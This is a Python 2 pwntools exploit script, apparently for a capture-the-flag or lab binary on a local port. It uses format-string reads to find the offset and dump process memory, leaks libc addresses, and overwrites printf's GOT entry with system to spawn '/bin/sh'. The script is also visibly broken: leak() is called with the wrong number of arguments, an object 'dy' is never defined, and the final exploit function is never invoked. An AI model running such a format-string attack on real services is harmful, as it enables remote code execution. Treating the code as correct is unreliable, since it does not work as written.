from pwn import *
import sys

context.log_level = 'debug'
#context.arch = 'amd64'
elf = ELF('./vuln32_fmt')

#io = process('./vuln32_fmt')

def exec_fmt(payload):
    io = remote('127.0.0.1', 2333)
    io.send(payload);
    data = io.recv()
    return data

def leak_fmt_off():
    auto_fmt = FmtStr(exec_fmt)
    print auto_fmt.offset
    #payload = fmtstr_payload(auto_fmt.offset, 

def vdump_proc():
    fake_addr_test = 'bbbb'
    vuln_start_addr = 0x8048000
    '''
    for i in range(20):
        io = remote('127.0.0.1', 2333)
        padd_str = '%' + str(i) + '$x'
        padd_str = padd_str.ljust(8, 'a') + fake_addr_test
        try:
            io.send(padd_str)
        except EOFError:
            print 'send fmt error'
            pass
        try:
            io.recv()
        except EOFError:
            print 'none string'
            pass
        io.close()
    '''
    fp_dump = open('proc.dump', 'ab+')
    leakfunc_offset = 0

    while True:
        io = remote('127.0.0.1', 2333)
        padd_str = '%' + str(13) + '$s'
        padd_str = padd_str.ljust(8, 'a') + p32(vuln_start_addr+leakfunc_offset)
        io.send(padd_str)
        try:
            data = io.recvuntil('aaa')[:-3]
        except EOFError:
            print hex(leakfunc_offset)
            sys.exit(0)
        data += '\x00'
        leakfunc_offset += len(data)
        fp_dump.write(data)
        fp_dump.flush()
        io.close()

    fp_dump.close()

io = remote('127.0.0.1', '2333')
main_func_addr = 0x80484CB
printf_got = 0x804A010

def leak(address, lsize):
    count = 0;
    padd_str = '%13$saaa' + p32(address)
    io.send(padd_str)
    leaked_data = io.recvuntil('aaa')[:-3]
    if len(leaked_data) > lsize:
        leaked_data = leaked_data[:lsize]
    else:
        leaked_data = leaked_data.ljust(lsize, '\x00')
    return leaked_data

def vexp():
    raw_input('continue?')
    payload = fmtstr_payload(11, {printf_got : system_addr})
    io.send(payload)
    io.sendline('/bin/sh')
    io.interactive()

leak_datetest = leak(printf_got)
system_addr = dy.lookup('system', 'libc')

io.close()

'''
read    0xf7689980      D5980
printf  0xf75fd670      49670
base    0xf75b4000
system                  3ada0
'''
